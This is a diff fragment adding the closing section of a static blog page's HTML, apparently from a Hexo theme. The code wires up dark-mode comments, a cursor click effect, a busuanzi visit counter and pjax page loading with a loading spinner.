+  $('.dark').click(function () {
+    setTimeout(() => {
+      dark_utterance();
+    });
+  })
+
+</script>
+
+<style>
+  .utterances {
+    max-width: inherit !important;
+  }
+</style>
+  
+
+
+<!-- 鼠标点击特效 -->
+<!-- 爱心点击 -->
+
+  
+    <script src="/js/cursor/text.js"></script>
+  
+
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" data-pjax></script>
+
+
+    <!-- pjax -->
+    
+
+<!-- pjax -->
+
+
+  <script src="/js/pjax@0.2.8/index.js"></script>
+  
+    <!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <div class="loading-circle"><div id="loader-circle"></div></div>
+    <script>
+      window.ShowLoading = function() {
+        $(".loading-circle").css("display", "block");
+      };
+      window.HideLoading = function() {
+        $(".loading-circle").css("display", "none");
+      }
+    </script>
+  
+	<script>
+    document.addEventListener('pjax:complete', function () {
+      window.HideLoading();
+    })
+    document.addEventListener('pjax:send', function () {
+      window.ShowLoading();
+    })
+    document.addEventListener('pjax:error', function () {
+      window.HideLoading();
+    })
+	</script>
+</div>
+
+  
+
+  <script>
+    var pjax = new Pjax({
+      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
+      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
+      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+      timeout: 5000
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+
+    })
+    
+    document.addEventListener('pjax:complete', function () {
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.location.href = e.triggerElement.href;
+    })
+    
+    // 刷新不从顶部开始
+    document.addEventListener("DOMContentLoaded", function () {
+      history.scrollRestoration = 'auto';
+    })
+  </script>
+
+
+
+  </body>
+</html>
